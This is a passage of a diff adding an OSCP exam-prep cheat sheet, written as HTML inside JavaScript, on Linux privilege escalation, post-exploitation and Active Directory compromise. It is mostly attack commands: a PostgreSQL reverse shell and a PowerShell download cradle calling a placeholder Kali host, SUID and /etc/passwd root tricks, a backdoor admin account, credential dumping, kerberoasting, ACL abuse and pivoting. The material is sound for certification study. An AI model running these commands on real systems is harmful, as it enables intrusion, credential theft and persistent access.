+<span class="ct">systemctl list-timers</span>
+<span class="cm"># Watch for hidden processes:</span>
+<span class="ct">./pspy64</span></div>
+<h4>Writable Cron Scripts</h4>
+<p>If a root cron job runs a writable script, append a reverse shell or SUID bash payload.</p>
+<h4>Cron PATH Hijack</h4>
+<div class="cb"><span class="cm"># If cron PATH includes a writable dir before /usr/bin:</span>
+<span class="cm"># Create same-named script in writable dir with payload</span></div>
+<h4>Wildcard Tar Attack</h4>
+<div class="cb"><span class="cm"># If cron runs: tar czf /backup/backup.tar.gz *</span>
+echo '' > '--checkpoint=1'
+echo '' > '--checkpoint-action=exec=sh privesc.sh'
+<span class="cm"># privesc.sh:</span>
+cp /bin/bash /tmp/bash_suid && chmod +s /tmp/bash_suid
+<span class="cm"># After cron runs:</span> /tmp/bash_suid -p</div>`},
+
+{step:"05",title:"Credential Hunting & Shadow Cracking",body:`<h4>Broad File Hunt</h4>
+<div class="cb"><span class="ct">find /</span> -type f \\( -iname '*.txt' -o -iname '*.log' -o -iname '*.ini' -o -iname '*.kdbx' -o -iname '*.db' -o -iname '*.bak' -o -iname '.env*' \\) 2>/dev/null</div>
+<h4>Credential Search</h4>
+<div class="cb">grep -RniE 'pass|password|passwd|pwd|secret|token|key|credential' /home /opt /srv /var/www /var/backups 2>/dev/null | head -300</div>
+<h4>SSH Key Handling</h4>
+<div class="cb"><span class="cm"># Found id_rsa? Copy to Kali:</span>
+chmod 600 id_rsa
+ssh -i id_rsa &lt;user&gt;@$IP
+<span class="cm"># Fix formatting if broken:</span>
+sed -i 's/\\r$//' id_rsa</div>
+<h4>Writable /etc/passwd</h4>
+<div class="cb"><span class="ct">ls -la /etc/passwd</span>
+<span class="cm"># If writable:</span>
+openssl passwd -6 -salt oscp Password123!
+echo 'root2:&lt;HASH&gt;:0:0:root:/root:/bin/bash' >> /etc/passwd
+su - root2</div>
+<h4>Shadow Cracking (unshadow + john)</h4>
+<div class="cb"><span class="cm"># If /etc/shadow is readable:</span>
+<span class="ct">unshadow</span> /etc/passwd /etc/shadow > unshadowed.txt
+<span class="ct">john</span> --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
+john --show unshadowed.txt</div>
+<h4>Disk Group (debugfs)</h4>
+<div class="cb"><span class="cm"># If user is in 'disk' group:</span>
+<span class="ct">debugfs</span> /dev/sda1
+cat /root/.ssh/id_rsa
+cat /etc/shadow</div>
+<h4>Docker / LXD Group (Instant Root)</h4>
+<div class="cb"><span class="ct">id</span> <span class="cm"># Check for docker or lxd group membership</span>
+
+<span class="cm"># Docker group = root</span>
+docker run -v /:/hostfs -it alpine chroot /hostfs sh
+
+<span class="cm"># LXD group = root</span>
+lxc init ubuntu:18.04 privesc -c security.privileged=true
+lxc config device add privesc host-root disk source=/ path=/mnt/root
+lxc start privesc && lxc exec privesc -- /bin/bash</div>
+<h4>Writable /etc/shadow</h4>
+<div class="cb"><span class="ct">ls -la /etc/shadow</span>
+<span class="cm"># If readable: copy to Kali and crack with john</span>
+<span class="cm"># If writable (rare): generate hash and replace root's</span>
+openssl passwd -6 -salt oscp Password123!
+<span class="cm"># Replace root's hash in /etc/shadow</span></div>
+<h4>NFS no_root_squash</h4>
+<div class="cb"><span class="ct">cat /etc/exports</span> <span class="cm"># Look for no_root_squash</span>
+<span class="cm"># From Kali as root:</span>
+mkdir /tmp/nfs && mount -t nfs $IP:/&lt;share&gt; /tmp/nfs
+cp /bin/bash /tmp/nfs/bash_suid && chmod +s /tmp/nfs/bash_suid
+<span class="cm"># On target:</span> /&lt;share&gt;/bash_suid -p</div>
+<h4>Writable Systemd Service Files</h4>
+<div class="cb">find /etc/systemd/system/ /lib/systemd/system/ -writable -type f 2>/dev/null
+<span class="cm"># If writable: edit ExecStart= to run reverse shell, then:</span>
+systemctl daemon-reload && systemctl restart &lt;service&gt;</div>
+<h4>MySQL / PostgreSQL Running as Root</h4>
+<div class="cb"><span class="cm"># Check: ps aux | grep -E 'mysql|postgres'</span>
+<span class="cm"># MySQL as root with creds:</span>
+mysql -u root -p -e "\\! bash -p"
+<span class="cm"># Or write SSH key:</span>
+SELECT "&lt;SSH_KEY&gt;" INTO OUTFILE '/root/.ssh/authorized_keys';
+
+<span class="cm"># PostgreSQL as root with creds:</span>
+psql -U postgres -c "COPY (SELECT '') TO PROGRAM 'bash -c \"bash -i >& /dev/tcp/&lt;KALI&gt;/443 0>&1\"'"</div>`},
+
+{step:"06",title:"Kernel Exploits (Last Resort)",body:`<div class="wb"><strong>Only after normal paths fail. Confirm OS/kernel version matches exactly.</strong></div>
+<div class="cb"><span class="ct">uname -a</span>
+<span class="ct">cat /etc/os-release</span></div>
+<table>
+<tr><th>Exploit</th><th>Kernel / Conditions</th></tr>
+<tr><td>PwnKit (CVE-2021-4034)</td><td>Almost all Polkit versions; <code>pkexec --version</code></td></tr>
+<tr><td>DirtyPipe (CVE-2022-0847)</td><td>Kernel 5.8 to 5.16.11</td></tr>
+<tr><td>DirtyCow (CVE-2016-5195)</td><td>Kernel 2.x to 4.x</td></tr>
+<tr><td>GameOver(lay) (CVE-2023-2640/32629)</td><td>Ubuntu OverlayFS</td></tr>
+<tr><td>Baron Samedit (CVE-2021-3156)</td><td>sudo before 1.9.5p2</td></tr>
+<tr><td>Copy Fail (CVE-2026-31431)</td><td>Python 3.10+, AF_ALG/authencesn</td></tr>
+</table>
+<div class="cb"><span class="cm"># linux-exploit-suggester</span>
+<span class="ct">./linux-exploit-suggester.sh</span>
+
+<span class="cm"># Compile kernel exploit</span>
+gcc exploit.c -o exploit
+gcc exploit.c -o exploit -static
+gcc exploit.c -o exploit -m32</div>
+<h4>Proof Capture</h4>
+<div class="cb"><span class="ct">whoami</span> && <span class="ct">hostname</span> && <span class="ct">ip addr</span>
+<span class="ct">cat /root/proof.txt</span>
+<span class="ct">cat /home/*/local.txt</span> 2>/dev/null</div>`}
+]},
+
+linux_root:{title:"Linux \u2014 Post-Exploitation",sections:[
+{step:"01",title:"Proof & Persistence",body:`<div class="wb"><strong>Screenshot proof.txt with <code>whoami && hostname && ip addr</code> visible. The screenshot is required for the report.</strong></div>
+<div class="cb"><span class="ct">whoami</span> && <span class="ct">hostname</span> && <span class="ct">ip addr</span>
+<span class="ct">cat /root/proof.txt</span>
+<span class="ct">find / -name local.txt -o -name proof.txt</span> 2>/dev/null</div>
+<h4>SSH Persistence (Optional If Bored)</h4>
+<div class="cb"><span class="cm"># Generate key on Kali</span>
+ssh-keygen -t rsa -f ./persist_key -N ''
+<span class="cm"># On target as root</span>
+mkdir -p /root/.ssh
+echo "&lt;PUBLIC_KEY&gt;" >> /root/.ssh/authorized_keys
+chmod 700 /root/.ssh && chmod 600 /root/.ssh/authorized_keys
+<span class="cm"># Connect from Kali</span>
+ssh -i persist_key root@$IP</div>
+<h4>Credential & Network Harvesting</h4>
+<div class="cb"><span class="cm"># Internal network discovery</span>
+ip route && arp -a && cat /etc/hosts
+
+<span class="cm"># Other users' SSH keys</span>
+find /home /root -name id_rsa -o -name id_ed25519 2>/dev/null
+
+<span class="cm"># History files</span>
+find / -name '.*history' -exec cat {} \\; 2>/dev/null
+
+<span class="cm"># Harvest /etc/shadow for cracking</span>
+cat /etc/shadow
+
+<span class="cm"># Database config files</span>
+find / -name '*.conf' -o -name '*.ini' -o -name '.env' 2>/dev/null | xargs grep -liE 'pass|password|secret' 2>/dev/null</div>`},
+{step:"02",title:"Credential Harvesting & Network Discovery",body:`<div class="cb"><span class="ct">cat /etc/shadow</span>
+grep -rli "password" /home/ /var/ /opt/ /etc/ 2>/dev/null
+find / -iname '*.kdbx' 2>/dev/null
+cat /home/*/.bash_history 2>/dev/null</div>
+<h4>Network Discovery</h4>
+<div class="cb"><span class="ct">ip addr</span>
+<span class="ct">ip route</span>
+<span class="ct">arp -a</span>
+<span class="ct">ss -tulpn</span>
+<span class="ct">cat /etc/resolv.conf</span></div>`}
+]},
+
+ad_initial:{title:"AD Set \u2014 Initial Access to MS01",sections:[
+{step:"01",title:"Exam Guardrails & Variable Setup (Optional)",body:`<div class="wb"><strong>AD Set = 40 points (MS01: 10, MS02: 10, DC01: 20).</strong> No SQLmap, no Nessus, no AI, no Responder poisoning. Metasploit on max 1 target. No Metasploit pivoting.</div>
+<h4>Variables</h4>
+<div class="cb"><span class="ct">export</span> DOM=&lt;DOMAIN&gt;  DC=&lt;DC_HOSTNAME&gt;  DC_IP=&lt;DC_IP&gt;
+<span class="ct">export</span> USER=&lt;foothold_user&gt;  PASS='&lt;foothold_pass&gt;'
+<span class="ct">export</span> MS01=&lt;MS01_IP&gt;  MS02=&lt;MS02_IP&gt;
+<span class="ct">export</span> KALI=$(ip -4 addr show tun0 | grep -oP '\\d+\\.\\d+\\.\\d+\\.\\d+')
+mkdir -p ~/oscp-ad/{scans,loot,tools,proofs}</div>
+<h4>DNS & /etc/hosts</h4>
+<div class="cb">echo "$DC_IP  $DC.$DOM $DC $DOM" | sudo tee -a /etc/hosts
+echo "$MS01  ms01.$DOM ms01" | sudo tee -a /etc/hosts
+echo "$MS02  ms02.$DOM ms02" | sudo tee -a /etc/hosts</div>
+<h4>Time Sync (Kerberos requires &lt;5min offset)</h4>
+<div class="cb"><span class="ct">sudo ntpdate</span> $DC_IP</div>`},
+
+{step:"02",title:"Test Foothold Credentials & Get Shell",body:`<div class="cb"><span class="cm"># Test creds against all services on MS01</span>
+<span class="ct">nxc smb</span> $MS01 -u $USER -p "$PASS"
+<span class="ct">nxc winrm</span> $MS01 -u $USER -p "$PASS"
+<span class="ct">nxc rdp</span> $MS01 -u $USER -p "$PASS"
+
+<span class="cm"># Also test against DC directly (sometimes foothold user has DC access!)</span>
+<span class="ct">nxc smb</span> $DC_IP -u $USER -p "$PASS"
+<span class="ct">nxc winrm</span> $DC_IP -u $USER -p "$PASS"
+
+<span class="cm"># Check password policy BEFORE any spraying (avoid lockouts)</span>
+<span class="ct">nxc smb</span> $DC_IP -u $USER -p "$PASS" --pass-pol
+
+<span class="cm"># Verify domain auth</span>
+dir \\\\$DOM\\SYSVOL\\
+<span class="cm"># If lists: creds valid. Hostname=Kerberos, IP=NTLM</span></div>
+<h4>Shell Access Options</h4>
+<div class="cb"><span class="cm"># evil-winrm (if WinRM open)</span>
+<span class="ct">evil-winrm</span> -i $MS01 -u $USER -p "$PASS"
+
+<span class="cm"># RDP (may be needed for GUI privesc)</span>
+<span class="ct">xfreerdp</span> /u:$USER /p:"$PASS" /d:$DOM /v:$MS01 /dynamic-resolution /cert:ignore
+
+<span class="cm"># PsExec (needs local admin)</span>
+<span class="ct">impacket-psexec</span> $DOM/$USER:"$PASS"@$MS01
+
+<span class="cm"># WMIExec (stealthier)</span>
+<span class="ct">impacket-wmiexec</span> $DOM/$USER:"$PASS"@$MS01</div>
+<h4>First Commands After Landing (Run Immediately)</h4>
+<div class="cb">ipconfig /all
+systeminfo
+route print
+arp -a
+netstat -ano
+tasklist
+schtasks
+sc query
+netsh interface show interface
+net use
+net localgroup Administrators
+net users</div>
+<div class="tb"><strong>Exam Tip:</strong> MS01 privesc is often in OSCP tips and tricks. Check service hijack, stored creds, PowerShell history. RDP may be necessary for some privesc paths.</div>`},
+
+{step:"03",title:"Run "+T.bh+" CE Immediately",body:`<div class="wb"><strong>Do this NOW.</strong> As soon as your domain creds work, run ${T.bh} collection before touching anything else on the AD set. It maps the entire domain and shows you the attack path.</div>
+<h4>Start ${T.bh} CE on Kali</h4>
+<div class="cb"><span class="ct">cd ~/bloodhound-ce && docker compose up -d</span>
+<span class="cm"># Access: http://localhost:8080</span></div>
+<h4>Collect Domain Data</h4>
+<div class="cb"><span class="ct">bloodhound-ce-python</span> --zip -c All -d $DOM -u $USER -p "$PASS" -dc $DC -ns $DC_IP
+<span class="cm"># Upload the resulting .zip to ${T.bh} CE web UI</span></div>
+<h4>Mark Owned &amp; Find the Path</h4>
+<ul>
+<li>Mark your foothold user as <strong>Owned</strong></li>
+<li>Run <strong>"Shortest Path to Domain Admin"</strong> &mdash; this is your roadmap</li>
+<li>Check Kerberoastable accounts &mdash; crack service account passwords</li>
+<li>Check AS-REP roastable accounts &mdash; no pre-auth required</li>
+<li>Look for ACL abuse: WriteDACL, WriteOwner, GenericAll, AddMember, ForceChangePassword</li>
+<li>Check which users have admin on which machines (lateral movement)</li>
+</ul>
+<div class="tb"><strong>Tip:</strong> The ${T.bh} graph tells you exactly what to attack. Don't waste time guessing &mdash; follow the path it shows you. Re-collect after every new credential or machine compromise to find new paths.</div>`},
+
+{step:"04",title:"Enumerate MS01",body:`<div class="cb"><span class="ct">whoami /priv</span>
+<span class="ct">whoami /groups</span>
+<span class="ct">net user</span> $USER /domain
+<span class="ct">net group /domain</span>
+<span class="ct">net group</span> "Domain Admins" /domain
+
+<span class="cm"># PowerShell history</span>
+type %APPDATA%\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt
+
+<span class="cm"># Browse filesystem</span>
+cd C:\\Users && tree /f /a
+dir C:\\ && dir C:\\inetpub 2>nul</div>
+<h4>LDAP Enumeration Fallback (if ${T.bh} has issues)</h4>
+<div class="cb"><span class="ct">ldapsearch</span> -x -H ldap://$DC_IP -D "$USER@$DOM" -w "$PASS" -b "DC=&lt;FIRST&gt;,DC=&lt;TLD&gt;" "(objectclass=user)" sAMAccountName
+<span class="ct">ldapsearch</span> -x -H ldap://$DC_IP -D "$USER@$DOM" -w "$PASS" -b "DC=&lt;FIRST&gt;,DC=&lt;TLD&gt;" "(objectclass=computer)" dNSHostName
+<span class="cm"># Replace DC=&lt;FIRST&gt;,DC=&lt;TLD&gt; with your domain (e.g. DC=corp,DC=local)</span></div>`}
+]},
+
+ad_ms01_lowpriv:{title:"AD \u2014 Escalate on MS01",sections:[
+{step:"01",title:"Local Privilege Escalation",body:`<p>Apply the full Windows privesc methodology. Key checks for AD MS01:</p>
+<ul>
+<li>SeImpersonatePrivilege &rarr; GodPotato / PrintSpoofer / SigmaPotato</li>
+<li>XAMPP/Apache httpd.exe writable binary &rarr; replace + restart</li>
+<li>Unquoted service paths</li>
+<li>Stored credentials (<code>cmdkey /list</code> + <code>runas /savecred</code>)</li>
+<li>PowerShell history creds</li>
+<li>McAfee SiteList.xml</li>
+<li>AlwaysInstallElevated</li>
+</ul>
+<div class="cb"><span class="ct">whoami /priv</span>
+<span class="ct">winPEASx64.exe</span>
+<span class="ct">powershell -ExecutionPolicy Bypass -File</span> .\\windows-exploit-suggester-standalone.ps1</div>
+<div class="tb"><strong>MS01 = 10 points.</strong> Don't spend too long. Escalate, harvest creds, move laterally.</div>`},
+{step:"02",title:"Network Discovery for Pivoting",body:`<div class="cb"><span class="ct">ipconfig /all</span>
+<span class="ct">route print</span>
+<span class="ct">arp -a</span>
+<span class="ct">netstat -ano</span>
+<span class="ct">nltest /dsgetdc:</span>$DOM</div>
+<h4>How to Infer Candidate Pivot Networks</h4>
+<ul>
+<li>1. Check <code>ipconfig /all</code> for multiple NICs / subnets</li>
+<li>2. Check <code>route print</code> for non-default routes</li>
+<li>3. Check <code>arp -a</code> for IPs in other subnets</li>
+<li>4. Check <code>netstat -ano</code> for connections to other subnets</li>
+<li>5. DNS/nltest output for DC IP (often in different subnet)</li>
+<li>6. SMB null sessions on discovered IPs</li>
+</ul>`}
+]},
+
+ad_ms01_admin:{title:"AD \u2014 Post-Admin MS01 & Lateral Movement",sections:[
+{step:"01",title:"Persistence & Credential Harvest on MS01",body:`<div class="cb"><span class="ct">net user</span> backdoor Password123! /add
+<span class="ct">net localgroup</span> Administrators backdoor /add
+<span class="ct">net localgroup</span> "Remote Desktop Users" backdoor /add
+<span class="ct">net localgroup</span> "Remote Management Users" backdoor /add
+<span class="ct">netsh advfirewall set allprofiles state off</span></div>
+<h4>${T.mk} Dump</h4>
+<div class="cb"><span class="ct">${T.mk}.exe</span> "privilege::debug" "token::elevate" "log" "lsadump::sam /patch" "lsadump::secrets" "lsadump::cache" "sekurlsa::logonpasswords full" "sekurlsa::ekeys" "exit"</div>
+<h4>NetExec from Kali</h4>
+<div class="cb"><span class="ct">nxc smb</span> $MS01 -u Administrator -p '&lt;pass&gt;' --sam
+<span class="ct">nxc smb</span> $MS01 -u Administrator -p '&lt;pass&gt;' --lsa
+<span class="ct">nxc smb</span> $MS01 -u Administrator -p '&lt;pass&gt;' -M lsassy</div>
+<div class="wb"><strong>Key:</strong> Note the <strong>Domain</strong> field in credential output. Domain creds are your ticket to lateral movement.</div>`},
+
+{step:"02",title:"Ligolo-ng Pivoting (Full Guide)",body:`<h4>Step A: Start Proxy on Kali</h4>
+<div class="cb"><span class="ct">sudo ./proxy</span> -selfcert -laddr 0.0.0.0:11601</div>
+<h4>Step B: Upload & Run Agent on MS01</h4>
+<div class="cb"><span class="ct">iwr</span> http://$KALI:8000/agent.exe -OutFile C:\\Windows\\Temp\\agent.exe
+C:\\Windows\\Temp\\agent.exe -connect $KALI:11601 -ignore-cert
+
+<span class="cm"># Background (PowerShell):</span>
+Start-Job { C:\\Windows\\Temp\\agent.exe -connect $KALI:11601 -ignore-cert }
+
+<span class="cm"># certutil fallback:</span>
+certutil -urlcache -f http://$KALI:8000/agent.exe C:\\Windows\\Temp\\agent.exe</div>
+<h4>Step C: Create Interface & Route (Modern Syntax)</h4>
+<div class="cb">session
+ifconfig
+<span class="ct">interface_create</span> --name ligolo-ms01
+<span class="ct">interface_add_route</span> --name ligolo-ms01 --route &lt;INTERNAL_SUBNET&gt;/24
+<span class="ct">tunnel_start</span> --tun ligolo-ms01</div>
+<h4>Step C (Legacy Fallback)</h4>
+<div class="cb"><span class="ct">sudo ip tuntap add user</span> $(whoami) mode tun ligolo
+<span class="ct">sudo ip link set</span> ligolo up
+<span class="ct">sudo ip route add</span> &lt;INTERNAL_SUBNET&gt;/24 dev ligolo
+<span class="cm"># In Ligolo: session -> select route with spacebar -> start</span></div>
+<h4>Autoroute (Quick Setup)</h4>
+<div class="cb"><span class="cm"># In Ligolo console:</span>
+autoroute
+<span class="cm"># Select route with spacebar, then start tunnel</span></div>
+<h4>240.0.0.1 Special IP (Auto Port Forward)</h4>
+<div class="cb"><span class="ct">sudo ip route add</span> 240.0.0.1/32 dev ligolo
+<span class="cm"># 240.0.0.1 auto-forwards ALL internal ports through Ligolo</span>
+<span class="cm"># Access internal service: curl http://240.0.0.1:&lt;PORT&gt;</span></div>
+<h4>Step D: Scanning Through Ligolo</h4>
+<div class="cb"><span class="cm"># MUST use TCP connect scans (no SYN/raw through tunnel)</span>
+<span class="ct">nmap -Pn -sT --unprivileged</span> -p 21,22,80,88,135,139,389,445,1433,3268,3389,5985 &lt;INTERNAL_IP&gt;
+
+<span class="cm"># DC indicators: ports 53,88,135,389,445,464,593,636,3268,3269,9389</span>
+<span class="cm"># Client: 445+135+3389/5985 but NO 88/389/3268/9389</span></div>
+<h4>Step E: Reverse Shell Callbacks Through Pivot</h4>
+<div class="cb"><span class="cm"># In Ligolo, select pivot session:</span>
+<span class="ct">listener_add</span> --addr 0.0.0.0:4444 --to 127.0.0.1:4444 --tcp
+<span class="cm"># Internal hosts connect to MS01:4444, relayed to Kali:4444</span></div>
+<h4>Step F: Double Pivot (MS01 &rarr; MS02 &rarr; Deeper)</h4>
+<div class="cb"><span class="cm"># On MS01 session, create listener for MS02's agent:</span>
+<span class="ct">listener_add</span> --addr 0.0.0.0:11602 --to 127.0.0.1:11601 --tcp
+<span class="cm"># On MS02, agent connects to MS01's internal IP:</span>
+agent.exe -connect &lt;MS01_INTERNAL_IP&gt;:11602 -ignore-cert
+<span class="cm"># In Ligolo: interface_create --name ligolo-ms02</span></div>
+<h4>Fallback: Chisel SOCKS</h4>
+<div class="cb"><span class="cm"># Kali:</span> chisel server --reverse -p 8080
+<span class="cm"># Target:</span> chisel client &lt;KALI&gt;:8080 R:socks
+<span class="cm"># Then use proxychains for tools</span></div>
+<h4>Validate Pivot</h4>
+<div class="cb"><span class="ct">nmap -Pn -sT --unprivileged -p 445</span> $DC_IP
+<span class="ct">nxc smb</span> $DC_IP -u $USER -p "$PASS"</div>
+<div class="wb"><strong>ALWAYS:</strong> After Ligolo setup, amend /etc/hosts with internal IPs. Routing + hosts = required.</div>`},
+
+{step:"03",title:T.bh+" CE & Domain Enumeration",body:`<h4>${T.bh} CE Docker Setup</h4>
+<div class="cb"><span class="cm"># Install (one-time):</span>
+curl -L https://ghst.ly/getbhce | docker compose -f - up
+<span class="cm"># Start if already installed:</span>
+cd ~/bloodhound-ce && docker compose up -d
+<span class="cm"># Access: http://localhost:8080</span></div>
+<h4>Collect Data (from Kali through pivot)</h4>
+<div class="cb"><span class="ct">bloodhound-ce-python</span> --zip -c All -d $DOM -u $USER -p "$PASS" -dc $DC -ns $DC_IP</div>
+<h4>What to Check in ${T.bh}</h4>
+<ul>
+<li>Mark owned users/computers</li>
+<li>Shortest path to Domain Admin</li>
+<li>Kerberoastable / AS-REP roastable accounts</li>
+<li>ACL abuse paths (GenericAll, WriteDACL, ForceChangePassword, WriteOwner)</li>
+<li>Accounts with "svc" in the name (service accounts)</li>
+</ul>
+<h4>Domain Enumeration via nxc</h4>
+<div class="cb"><span class="ct">nxc smb</span> $DC_IP -u $USER -p "$PASS" --users
+<span class="ct">nxc smb</span> $DC_IP -u $USER -p "$PASS" --shares
+<span class="ct">nxc smb</span> $DC_IP -u $USER -p "$PASS" --pass-pol
+<span class="ct">nxc smb</span> $DC_IP -u $USER -p "$PASS" -M gpp_password
+<span class="cm"># ^ GPP passwords = quick win. Check this early!</span>
+
+<span class="cm"># ADCS: check for vulnerable certificate templates NOW</span>
+<span class="ct">${T.cert}-ad find</span> -u $USER@$DOM -p "$PASS" -dc-ip $DC_IP -vulnerable
+
+<span class="cm"># Unconstrained delegation check</span>
+<span class="ct">nxc ldap</span> $DC_IP -u $USER -p "$PASS" --trusted-for-delegation</div>`},
+
+{step:"04",title:"Kerberoasting & AS-REP Roasting",body:`<h4>Kerberoasting</h4>
+<div class="cb"><span class="ct">nxc ldap</span> $DC_IP -u $USER -p "$PASS" --kerberoasting kerb_hashes.txt
+
+<span class="cm"># Hash type guide:</span>
+<span class="cm"># $krb5tgs$23$ = RC4 (hashcat -m 13100)</span>
+<span class="cm"># $krb5tgs$17$ = AES128 (hashcat -m 19600)</span>
+<span class="cm"># $krb5tgs$18$ = AES256 (hashcat -m 19700)</span>
+
+<span class="ct">hashcat -m 13100</span> kerb_hashes.txt /usr/share/wordlists/rockyou.txt <span class="cf">-r /usr/share/hashcat/rules/best64.rule</span></div>
+<h4>AS-REP Roasting</h4>
+<div class="cb"><span class="ct">nxc ldap</span> $DC_IP -u $USER -p "$PASS" --asreproast asrep_hashes.txt
+<span class="ct">hashcat -m 18200</span> asrep_hashes.txt /usr/share/wordlists/rockyou.txt <span class="cf">-r /usr/share/hashcat/rules/best64.rule</span>
+
+<span class="cm"># Without creds (need username list):</span>
+<span class="ct">impacket-GetNPUsers</span> $DOM/ -usersfile users.txt -dc-ip $DC_IP -format hashcat</div>`},
+
+{step:"05",title:"ACL / DACL Abuse (WriteDACL, WriteOwner, GenericAll)",body:`<div class="tb"><strong>Exam Tip:</strong> WriteDACL is a common path. Grant yourself rights, add to Domain Admins, DCSync.</div>
+<h4>WriteDACL (grant yourself FullControl)</h4>
+<div class="cb"><span class="ct">dacledit.py</span> -action write -rights FullControl -principal $USER -target &lt;TARGET_USER_OR_GROUP&gt; $DOM/$USER:"$PASS" -dc-ip $DC_IP</div>
+<h4>WriteOwner</h4>
+<div class="cb"><span class="ct">owneredit.py</span> -action write -new-owner $USER -target &lt;TARGET&gt; $DOM/$USER:"$PASS" -dc-ip $DC_IP
+<span class="cm"># Then grant yourself GenericAll via dacledit</span></div>
+<h4>GenericAll on User &rarr; Reset Password</h4>
+<div class="cb"><span class="ct">bloodyAD</span> --host $DC_IP -d $DOM -u $USER -p "$PASS" set password &lt;target_user&gt; 'NewPass123!'</div>
+<h4>GenericAll / AddMember on Group</h4>
+<div class="cb"><span class="ct">bloodyAD</span> --host $DC_IP -d $DOM -u $USER -p "$PASS" add groupMember "Domain Admins" $USER</div>
+<h4>Targeted Kerberoast via GenericWrite</h4>
+<div class="cb"><span class="cm"># Set SPN on target user, then Kerberoast them:</span>
+<span class="ct">bloodyAD</span> --host $DC_IP -d $DOM -u $USER -p "$PASS" set object &lt;target_user&gt; servicePrincipalName -v "MSSQLSvc/fake:1433"
+
+<span class="cm"># After cracking, clean up the SPN:</span>
+<span class="ct">bloodyAD</span> --host $DC_IP -d $DOM -u $USER -p "$PASS" set object &lt;target_user&gt; servicePrincipalName</div>`},
+
+{step:"06",title:"bloodyAD — Recommended AD Swiss-Army Knife",body:`<p><a href="https://github.com/CravateRouge/bloodyAD" target="_blank">bloodyAD</a> is the recommended tool for AD object manipulation from Kali. It handles most ACL abuse, group changes, and password resets in a single tool without needing PowerShell on the target.</p>
+<div class="cb"><span class="cm"># Install (one-time)</span>
+<span class="ct">pipx install bloodyAD</span></div>
+<h4>Quick Reference &mdash; Common Operations</h4>
+<table>
+<tr><th>Task</th><th>Command</th></tr>
+<tr><td>Reset user password</td><td><code>bloodyAD --host $DC_IP -d $DOM -u $USER -p "$PASS" set password &lt;target&gt; 'NewPass!'</code></td></tr>
+<tr><td>Add user to group</td><td><code>bloodyAD --host $DC_IP -d $DOM -u $USER -p "$PASS" add groupMember "Domain Admins" $USER</code></td></tr>
+<tr><td>Set SPN (targeted Kerberoast)</td><td><code>bloodyAD --host $DC_IP -d $DOM -u $USER -p "$PASS" set object &lt;user&gt; servicePrincipalName -v "MSSQLSvc/fake:1433"</code></td></tr>
+<tr><td>Read object ACL</td><td><code>bloodyAD --host $DC_IP -d $DOM -u $USER -p "$PASS" get object &lt;target&gt; --attr nTSecurityDescriptor</code></td></tr>
+<tr><td>Add computer account</td><td><code>bloodyAD --host $DC_IP -d $DOM -u $USER -p "$PASS" add computer FAKE$ 'Password123!'</code></td></tr>
+<tr><td>Set RBCD</td><td><code>bloodyAD --host $DC_IP -d $DOM -u $USER -p "$PASS" add rbcd &lt;TARGET$&gt; FAKE$</code></td></tr>
+<tr><td>Read LAPS password</td><td><code>bloodyAD --host $DC_IP -d $DOM -u $USER -p "$PASS" get object &lt;COMPUTER$&gt; --attr ms-mcs-admpwd</code></td></tr>
+<tr><td>Shadow Credentials</td><td><code>bloodyAD --host $DC_IP -d $DOM -u $USER -p "$PASS" add shadowCredentials &lt;target&gt;</code></td></tr>
+</table>
+<div class="tb"><strong>Why bloodyAD?</strong> It runs from Kali (through Ligolo), doesn't need PowerShell on the target, supports NTLM hash auth (<code>-p :&lt;HASH&gt;</code>), and handles most AD object manipulation in one tool. Use it instead of juggling dacledit, owneredit, and PowerShell AD modules.</div>`},
+
+{step:"07",title:"Password Spraying & Credential Reuse",body:`<div class="cb"><span class="cm"># Spray against MS02 (one password at a time!)</span>
+<span class="ct">nxc smb</span> $MS02 -u users.txt -p passwords.txt --continue-on-success
+<span class="ct">nxc smb</span> $MS02 -u users.txt -p passwords.txt --local-auth --continue-on-success
+
+<span class="cm"># Pass-the-Hash</span>
+<span class="ct">nxc smb</span> $MS02 -u &lt;user&gt; -H &lt;NTLM_HASH&gt;
+
+<span class="cm"># WinRM, RDP, MSSQL too</span>
+<span class="ct">nxc winrm</span> $MS02 -u users.txt -p passwords.txt --continue-on-success
+<span class="ct">nxc mssql</span> $MS02 -u users.txt -p passwords.txt --continue-on-success</div>
+<h4>MSSQL Through Ligolo (Base64 PowerShell Reverse Shell)</h4>
+<div class="cb"><span class="cm"># Generate base64 encoded PS reverse shell on Kali:</span>
+echo -n "IEX(New-Object Net.WebClient).DownloadString('http://&lt;KALI&gt;:8000/shell.ps1')" | iconv -t UTF-16LE | base64 -w 0
+
+<span class="cm"># In MSSQL after xp_cmdshell enabled:</span>
+EXEC xp_cmdshell 'powershell -enc &lt;BASE64_STRING&gt;'</div>
+<h4>Share/File Hunting & LAPS</h4>
+<div class="cb"><span class="ct">nxc smb</span> $DC_IP -u $USER -p "$PASS" --shares
+<span class="ct">nxc smb</span> $DC_IP -u $USER -p "$PASS" -M spider_plus
+<span class="ct">nxc ldap</span> $DC_IP -u $USER -p "$PASS" -M laps</div>`}
+]},
+
+ad_ms02:{title:"AD \u2014 MS02 to Domain Controller",sections:[
+{step:"01",title:"Access & Escalate on MS02",body:`<div class="cb"><span class="cm"># Access via WinRM / RDP / MSSQL</span>
+<span class="ct">evil-winrm</span> -i $MS02 -u &lt;user&gt; -p '&lt;pass&gt;'
+<span class="cm"># Or pass-the-hash:</span>
+<span class="ct">evil-winrm</span> -i $MS02 -u &lt;user&gt; -H &lt;NTLM_HASH&gt;</div>
+<p>Repeat full Windows privesc on MS02: privileges, services, scheduled tasks, stored creds, files.</p>
+<div class="tb"><strong>File transfer through pivot:</strong> If HTTP fails, use nxc put, SMB share, or base64 encode the file.</div>`},
+
+{step:"02",title:"Credential Harvesting on MS02",body:`<div class="cb"><span class="ct">${T.mk}.exe</span> "privilege::debug" "token::elevate" "sekurlsa::logonpasswords full" "lsadump::sam" "lsadump::secrets" "lsadump::cache" "exit"
+
+<span class="cm"># From Kali:</span>
+<span class="ct">nxc smb</span> $MS02 -u Administrator -p '&lt;pass&gt;' --sam --lsa
+<span class="ct">impacket-secretsdump</span> &lt;user&gt;:'&lt;pass&gt;'@$MS02</div>
+<div class="wb"><strong>Key:</strong> If Domain Admin creds found here, skip directly to DC01.</div>`},
+
+{step:"03",title:"ADCS Certificate Abuse (ESC1/ESC4/ESC8)",body:`<div class="cb"><span class="cm"># Find vulnerable templates:</span>
+<span class="ct">${T.cert}-ad find</span> -u &lt;user&gt;@$DOM -p '&lt;pass&gt;' -dc-ip $DC_IP -vulnerable
+
